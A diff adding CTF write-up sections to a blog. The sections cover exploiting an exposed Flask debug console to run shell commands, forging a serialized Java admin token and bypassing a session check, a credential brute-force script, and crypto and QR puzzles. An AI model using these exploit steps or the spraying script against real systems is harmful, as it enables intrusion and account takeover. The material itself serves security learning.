@@ -401,7 +401,7 @@ We try to decode this content but we do not get a flag per se. So we understand 
 We also notice another file within the zip named as **`flag.txt`** the contents of which are **`key: zctf2022`**. This also points toward the fact that the content is encrypted and the possible key is **`zctf2022`**.  
 
 Now one last part that we need to figure out is the type of encryption that could have been used.  
-We use [this][2] online tool to run the decryption and tranformation in a fast way. It has support for various decryption schemes and we use them to find.  
+We use [this][2] online tool to run the decryption and tranformation in a fast way. It has support for various decryption schemes that can be tried out easily.  
 
 
 However in hindisight going through the **challenge instructions** again gives us a clue on the encryption scheme. The clue talks about **`fish`** and there is an encryption scheme called **`Blowfish`**.  
@@ -418,10 +418,326 @@ On running the above transformation we get the below string which is again Base6
 **`WkNURjIwMjJ7RzBPRF9KMCRfWTB1X0YwVW45X3Q1M19mTEBnX2gzNjN9`**  
 
 We Base64 decode it once more to get the flag as below:  
-**`ZCTF2022{G0OD_J0$_Y0u_F0Un9_t53_fL@g_h363}`**. You can check the whole transformation [here][3].
+**`ZCTF2022{G0OD_J0$_Y0u_F0Un9_t53_fL@g_h363}`**. You can check the whole transformation [here][3].  
+
+
+## Rampage 🐞
+Web
+{: .label .label-green .fs-1 .ml-0}
+
+It was the web challenge released in the second wave of challenges and was a bit easier than the previous two. It was more of a **`Flask`** package behavioural issue that had to be exploited.  
+
+Challenge instructions:
+> The developer of the application made a huge mistake which made the whole organization go rampage. Can you find his mistake? anyway the application died and all it showing a source page.
+> Link : https://h22-ctf-0ecwn9kp0g.dummydomain.team/
+
+
+The link had the below source code:
+```python
+from flask import Flask, render_template
+app = Flask(__name__)
+@app.route('/')
+def home():
+   return render_template('base.html')
+if __name__ == '__main__':
+   app.run("0.0.0.0",debug=True)
+```
+
+From the source and the challenge instructions it was very clear that we had to exploit some coding language or package specific vulnerability. Looking at source code the only thing that is wrong is the part where **`debug=True`** is set.  
+
+On quickly searching for **`debug`** behaviour of **`Flask`** it was clear that the **`Python`** console is exposed at **`/console`** url of the same host and port on which the application was running.  
+
+Thus invoking the below URL gave us an interactive **`Python`** console.  
+> https://h22-ctf-0ecwn9kp0g.dummydomain.team/console
+> Note: Link might not be active
+
+Once we have the server's **`Python`** console, all we had to do was to establish a piped subprocess to retrieve the flag from most probably a file. We can also execute the required **`ls`** command to get the file name as seen below.  
+
+```sh
+>>> import subprocess;out = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+b'app.py\nflag.txt\nrequirements.txt\ntemplates\n'
+
+>>> import subprocess;out = subprocess.Popen(['cat', 'flag.txt'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+b'ZCTF2022{N3v3r_3v3r_Switch_0n_deBug_m0d3_It_HuRts}\n'
+```  
+> Note:  However while trying this, there were some repeated attempts required as there was some obscure "URL requested not found" error.  
+
+From the above, we obtain the final flag as **`ZCTF2022{N3v3r_3v3r_Switch_0n_deBug_m0d3_It_HuRts}`**.  
+
+
+## Map map 🧩
+Misc
+{: .label .label-green .fs-1 .ml-0}
+
+
+It was another interesting challenge under the miscellaneous category which was geared towards beginners. It needed only basic logic and understanding to get it right.  
+
+<details markdown="block">
+  <summary>
+  Challenge instructions:
+  </summary>
+
+> Map me in the correct order ! you will get the reward " " , "▄" , "▀","█"
+>
+> 222222222222222222222222222222222
+> 222222222222222222222222222222222 
+> 222213333312233143441213333312222 
+> 222212111212431122441212111212222 
+> 222212333212341233324212333212222 
+> 222233333332343214123233333332222 
+> 222233422133431231244422134442222
+> 222232411434234132422312432332222
+> 222243111332411241143332143122222
+> 222212431233243242443121233432222
+> 222232222333123231421333132232222
+> 222213333312142434221232114212222
+> 222212111212231312421331331312222
+> 222212333212424212121142233232222
+> 222233333332333333332323233332222
+> 222222222222222222222222222222222
+> 222222222222222222222222222222222
+
+</details>
+
+From the challenge instructions we make couple of observations. We are given 4 different ASCII character codes and the matrix given also has 4 unique numbers. The challenge title being **`Map map`** it screams out that we need to map the numbers to the ASCII characters.  
+
+We had different possible combinations and we write a simple **`python`** script to do the same which is listed below.  
+
+<details markdown="block">
+  <summary>
+  map.py:  
+  </summary>
+
+
+```python
+values = {2: " ", 4: "▄", 3: "▀", 1: "█"}
+block_len = len("222222222222222222222222222222222")
+nums = "222222222222222222222222222222222222222222222222222222222222222222222213333312233143441213333312222222212111212431122441212111212222222212333212341233324212333212222222233333332343214123233333332222222233422133431231244422134442222222232411434234132422312432332222222243111332411241143332143122222222212431233243242443121233432222222232222333123231421333132232222222213333312142434221232114212222222212111212231312421331331312222222212333212424212121142233232222222233333332333333332323233332222222222222222222222222222222222222222222222222222222222222222222222"
+
+patt = ""
+count = 0
+for ch in nums:
+    ich = int(ch)
+    patt = patt + values[ich]
+    count += 1
+    if count >= block_len:
+        count = 0
+        print(patt)
+        patt = ""
+```  
+</details>  
+<br>
+
+The above script gives the below output which gives us a QR code. I have used the correct combination in the map **`values`** available in the above code. However I did arrive at it after trying out different combinations.  
+
+![QR Code][4]  
+
+Scanning the QR code gives us **`ZCTF2022{0h_mY_QR_h3r0}`** as the required flag.  
+
+
+## Modular arithmetic 🧮
+Crypto
+{: .label .label-green .fs-1 .ml-0}
+
+As part of the Crypto challenges, this was one of the simpler challenges. It was mainly based on the vulnerability that modulo arithmetic poses if the multiplicative factor of the key is not sufficiently larger than the modulus.  
+
+Challenge instructions:  
+> Welcome to the modular arithmetic problem! all you have to do is retrieve the flag ! ez cap right?
+>
+> FLAG * 119948116572587480997985582334842499834139017074740244172893978641231971653679284885535770764885244146275107129639174950656129550741242015487644374633039028514213604207859710602579233565386512264983884893313264852933857570177107480942356063931856766071742206951696545246969307478515463331847910116687811549789 % 27798671172746123316367501554477714103201077664553055338381724229489308743252202673118338431986735820935502500168807967396109872212519718089843955114568715431983462347218151678596224481078105682883598874441804051055671916685902451927596655109511274227936790635451155327589740397737027253878906663847852789425886906175306456096029392317222257565763986277028821850346539761626776804138546602611623627585179746501285952243310794924241242006941368358489947933506553709491278176484915039735992701770209543217307930974195820136254927926713710676823548977484140850943548032532442073006093861313068867360841315453657119523669
+>
+> Result : 320938689236299679882228352461175650128560680204086548880945883660230710225726172454365953302228156195553468796283457018982013991926073747557019778673497352651787839537737262282694815984977750655402260723735979848907965825257552421064475750167621301717001579464850917047033379556568052340366800783687164883470058975127916314456063209401613050634931788089301208390828770979601290161172981353
+> 
+
+From the instructions it is clear that there is no real RSA involved here. It is purely based on modulo operation. Another thing that we can immediately note is that the multiplying number has less than half the digits as compared to the number used for modulo.  
+
+This means we are performing a modulo using a very large number and as the multiplying number is very small, and message generally we are looking for is a small flag, the modulo would have been of no use i.e the modulus would have been the value **`0`**.  
+
+So we try dividing the result by the multiplied number and convert the long to bytes to check for the flag format. We use the below script to do the same.  
+
+<details markdown="block">
+  <summary>
+  find_modulo.py
+  </summary>
+  
+```python
+# FLAG * K % mod_e = cip
+k = 119948116572587480997985582334842499834139017074740244172893978641231971653679284885535770764885244146275107129639174950656129550741242015487644374633039028514213604207859710602579233565386512264983884893313264852933857570177107480942356063931856766071742206951696545246969307478515463331847910116687811549789
+
+mod_e = 27798671172746123316367501554477714103201077664553055338381724229489308743252202673118338431986735820935502500168807967396109872212519718089843955114568715431983462347218151678596224481078105682883598874441804051055671916685902451927596655109511274227936790635451155327589740397737027253878906663847852789425886906175306456096029392317222257565763986277028821850346539761626776804138546602611623627585179746501285952243310794924241242006941368358489947933506553709491278176484915039735992701770209543217307930974195820136254927926713710676823548977484140850943548032532442073006093861313068867360841315453657119523669
+
+cip = 320938689236299679882228352461175650128560680204086548880945883660230710225726172454365953302228156195553468796283457018982013991926073747557019778673497352651787839537737262282694815984977750655402260723735979848907965825257552421064475750167621301717001579464850917047033379556568052340366800783687164883470058975127916314456063209401613050634931788089301208390828770979601290161172981353
+
+from Crypto.Util.number import long_to_bytes
+
+print(long_to_bytes(cip // k))
+```
+
+</details>  
+
+The output of running the above script gives us the required flag **`ZCTF2022{modular_arithmetic_r0cks}`**.  
+
+
+## Serial killer ☠️
+Web
+{: .label .label-green .fs-1 .ml-0}
+
+The category and the name of this challenge clearly pointed out that it was some kind of object deserialization vulnerability. We were supposed to inject a newly crafted/serialized object to get the flag.  
+
+Challenge instructions:
+> Challenge URL : https://h22-ctf-i16omaetxx.dummydomain.team/App/
+>
+> Source: link Password: zCtf_2022
+
+> Note: The challenge URL might not be active now. The source link is available [here][5].  
+
+On analyzing the URL we are presented with a login page. Also we unzip the source link using the given password to obtain two files, one is the application's war file and another is a library used to generate a serialized object.  
+
+We decompile the application's jar files using our favourite IDE or any Java decompilation tool [online][7] and go through the source code to note the below key points:  
+
+> Info: You can download the decompiled source for this challenge readily [here][6].
+
+1. On checking the file **Home.java** we see that the flag is available in the **`/flag`** url.
+2. However the **`/flag`** url can only be accessed with a token that passes the **`Helper.isAdmin(token)`** check.
+3. The token is obtained from the cookie named **`token`** and from **Login.java** it is clear that the **`token`** cookie is set to the Base64 encoded serialized **`AuthToken`** object.
+4. The **`Helper.isAdmin(token)`** check verifies if the **`AuthToken`** object has the **role** set to **`Role.ADMIN`**.
+5. Another important point is the fact that there is proper whitelisting of specific classes which alone pass through the **`SecureObjectInputStream.java`** and get deserialized. So its **NOT** a random deserialization vulnerability where we can get a reverse shell.
+
+From the above we understand that we need to craft a serialized AuthToken object that has username set to **`admin`** and role set to **`admin`**.  
+
+To do the same, we go ahead and write a small Java code that depends on the source code of the application. So we create a Java class within the **`WEB-INF/classes`** folder present inside the **`App.war`** file with the below code.  
+
+SerializedAuthToken.java  
+
+```java
+public class SerializedAuthToken {
+    public static void main(String args[]) throws Exception {
+        AuthToken authToken = new AuthToken("user");
+        authToken.setUsername("admin");
+        authToken.setRole(Role.ADMIN);
+        System.out.println(Helper.serialize(authToken));
+        
+    }
+}
+```
+
+Compile and run this code to get the serialized Base64 encoded string.  
+
+```sh
+┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/serial_killer]
+└─$ javac SerializedAuthToken.java 
+
+┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/serial_killer]
+└─$ java SerializedAuthToken 
+rO0ABXNyAAlBdXRoVG9rZW6F6PRQzP741QIAAkwABHJvbGV0AAZMUm9sZTtMAAh1c2VybmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwfnIABFJvbGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AAVBRE1JTnQABWFkbWlu
+```
+
+Now we have the payload. We can immediately change the session token during login, by changing the value for the session key **`token`**.  
+
+However this does not solve the challenge and the page does not get opened. So next I went on to analyze the exact authentication code available in **`Flag.java`** and highlight the specific checks that we need to bypass:
+
+```java
+line 26: if (Helper.isAdmin(token) && sessionId != null) {
+line 39: if (sc.contains(sessionId.getValue())) {
+```
+
+The first check is bypassed by changing the **`token`** value to the new crafted seriaized payload and setting the **`JSESSIONID`** value to something that is already available in the **`/zctf/jsessions`** file. However the check has a security issue. It uses the **`contains`** check which means we can modify the **`sessionId`** value to any random character which is generally present in a session id that is generated by Tomcat session.  
+
+So our final bypass is to modify the **`JSESSIONID`** to some random character(s) that are generally present in the session ids.  
+
+Doing this gives us the flag page with the required flag.
+
+
+## Basic Web Login 1 🕸
+Web
+{: .label .label-green .fs-1 .ml-0}
+
+This was the first Web challenge and was very clear that brute forcing was the only way out. However I was reluctant to brute force due to which it dragged to the last moment for me to solve this challenge.  
+
+Challenge instructions:
+> An Ops team member usually saves his account details in google chrome and it got leaked in the dark web through browser sync and vulnerable extensions from his personal machine.
+> 
+> The username and password is suspected to be present here - Link
+>
+> https://h22-ctf-kr2i71j106.dummydomain.team/
+> 
+> Note: The link just contained a list of strings that are suspected to be the username and/or password.
+> 
+
+As stated before this was a password spray attack and we had to run a random username and password attack. I did try using the **`Intruder`** tool in [Burpsuite][8]. However there are lot of restrictions in the tool and almost did not solve for me.  
+
+So finally I ended up creating a **`python`** script for the same which can be seen below.  
+> Note: Before running the python script please create a password list file named `passlist.txt` in the same folder.
+
+<details markdown="block">
+  <summary>
+  Click here to view **`solve.py`**
+  </summary>
+
+```python
+import requests
+from tqdm import tqdm
+
+with open("passlist.txt", "r") as fp:
+    leaked_creds = fp.read().splitlines()
+
+print(leaked_creds, len(leaked_creds))
+
+URL = "https://h22-ctf-kr2i71j106.dummydomain.team/validate"
+
+headers = {
+    "Host": "h22-ctf-kr2i71j106.dummydomain.team",
+    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "https://h22-ctf-kr2i71j106.dummydomain.team",
+    "DNT": "1",
+    "Connection": "keep-alive",
+    "Referer": "https://h22-ctf-kr2i71j106.dummydomain.team/login",
+    "Cookie": "AWSALB=O+/5TF41uJ/Z2udNP3tuRE9vqS1LMWrdo7IHNknQm66GDKxC/62whUmMk0Ic6zgHwQM4ILOJh8jX735qO2/GlidDJPOiFWZecbV6OKJiaqCFOVcU2NrGbaorpfkw; AWSALBCORS=O+/5TF41uJ/Z2udNP3tuRE9vqS1LMWrdo7IHNknQm66GDKxC/62whUmMk0Ic6zgHwQM4ILOJh8jX735qO2/GlidDJPOiFWZecbV6OKJiaqCFOVcU2NrGbaorpfkw; session=2e4dcc10-f626-4610-8fbb-688a73b1c0dc",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+}
+
+
+data = {"username": "abc", "password": "xyz"}
+unames = [
+    "uname1",
+    "uname2",
+]
+
+for u in tqdm(unames):
+    data["username"] = u
+    for p in tqdm(leaked_creds):
+        data["password"] = p
+        resp = requests.post(URL, data=data, headers=headers)
+        if (not "Try again! Validation failed" in resp.text) or resp.status_code != 200:
+            print(str(resp))
+            print(resp.text)
+            print(resp.status_code)
+            print(data)
+
+
+```
+</details>
+
+Another way to reduce the hit space is to select only specific strings from the list which seem to be something apt for an username. It is again just a guess and to reduce the search space and does not guarantee that your hunch will be right.  
+Sometimes instincts guide you through the challenges.  
+
+Finally the specific username turned out to be **`img3niu$`** and the password was **`1qaz2wsx`**. The required flag was presented to us in the response as **`ZCTF2022{Th@l@_Fir$tu_Murd3ruu!}`**.  
 
 
 
 [1]: https://mega.nz/file/d9oWFQgD#iA13Jhv-q8boF_B1KnV6MfVAV3wYKZF3jmwv6_SsxgQ
 [2]: https://gchq.github.io/CyberChef/
 [3]: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Blowfish_Decrypt(%7B'option':'UTF8','string':'zctf2022'%7D,%7B'option':'UTF8','string':'zctf2022'%7D,'ECB','Raw','Raw')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=c3lkMkJucEZQWjVER2Fab1dNVGRzUVJldlU4Qk54NGlvU2VVTEh3c3JyMnltM0FNbWRjNXFRUmRTKzhpMnFEb3JITXFwR1NLMG1md3lNTG5CNWwzd1E9
+[4]: ../assets/images/bWFwX21hcF9xcl9jb2Rl.png
+[5]: https://mega.nz/file/5lQjFDYY#l2KnRqK4P7PbxMULGk3fH-zI919AsXWUm_bEliGXA98
+[6]: https://mega.nz/file/ItxhDTBI#YOSo7fnTHPx7lIumEvQlIwT8p5l-HOZmWijmqMWEIEc
+[7]: http://www.javadecompilers.com/
+[8]: https://portswigger.net/burp/documentation/desktop/tools/intruder
